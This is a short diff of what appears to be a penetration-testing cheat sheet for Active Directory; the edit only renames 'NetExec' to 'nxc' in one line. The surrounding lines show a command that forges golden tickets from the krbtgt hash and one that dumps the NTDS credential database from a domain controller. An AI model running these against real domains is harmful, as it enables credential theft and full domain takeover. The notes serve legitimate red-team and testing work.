@@ -286,7 +286,7 @@ impacket-ticketer -nthash {{KRBTGT_NT:str:abc123...}} -domain-sid {{SID:str:S-1-
 ---
 
 ## dump ntds with ccache
-Use Linux kerb cache with NetExec.
+Use Linux kerb cache with nxc.
 
 ```bash
 KRB5CCNAME={{CCACHE:file:user.ccache}} nxc smb {{DC_HOST:str:dc01.corp.local}} -k --use-kcache --ntds
